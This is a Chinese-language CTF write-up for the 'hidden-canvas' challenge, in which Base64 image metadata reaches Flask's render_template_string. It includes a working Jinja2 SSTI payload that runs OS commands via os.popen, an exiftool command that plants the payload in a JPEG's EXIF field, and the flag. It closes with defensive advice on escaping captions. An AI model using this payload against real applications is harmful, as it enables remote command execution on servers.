# hidden-canvas

## 题目简述

站点允许上传 PNG/JPEG 头像，并尝试显示图片元数据中的 caption。处理链依次是：验证真实图片、读取 PNG `ProfileCaption` 或 JPEG EXIF `ImageDescription`、验证并解码 Base64、最后把解码结果传给 `render_template_string`。因此，合法图片的元数据可以携带 Jinja2 SSTI，而无需绕过图像格式校验。

## 解题过程

`utils.py` 对 JPEG 读取 EXIF 标签 `0x010E`，即 `ImageDescription`；`app.py` 随后执行：

```python
decoded_caption, error = decode_base64_caption(raw_caption)
rendered_output = render_template_string(decoded_caption)
```

这里没有把 caption 当普通文本转义，而是再次作为模板源码编译。可从 Flask 模板全局对象 `config` 进入其类初始化函数的全局命名空间，取得 `os` 模块并执行命令：

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
```

元数据必须是无换行、长度为 4 的倍数且能通过严格校验的 Base64。准备任意一张有效 JPEG 后执行：

```bash
payload="{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
caption=$(printf '%s' "$payload" | base64 -w0)
exiftool -overwrite_original "-EXIF:ImageDescription=$caption" avatar.jpg
```

上传 `avatar.jpg` 并进入 `/profile`。服务器验证图片后提取 EXIF、解码 caption 并渲染模板，页面显示：

```text
tjctf{H1dd3n_C@nv@s_D3c0d3d_4nd_R3nd3r3d!}
```

该链已用实际 JPEG EXIF 和 Flask 测试客户端复验：图片验证、标签 `270` 提取、Base64 解码和模板执行四个阶段均成功。承载图片本身没有不可替代的视觉信息，所以归档只保留可复现的文本命令，不额外复制一张任意头像。

## 方法总结

- 核心技巧：把 SSTI 载荷放入合法图片元数据，经过 Base64 解码后进入 Jinja2 二次模板解释。
- 识别信号：上传后读取 caption、元数据被 Base64 解码、`render_template_string` 接收用户可控字符串。
- 复用要点：图片内容校验只能证明载体格式有效，不能证明元数据安全；caption 应作为数据传给固定模板并自动转义，绝不能把它当模板源码执行。
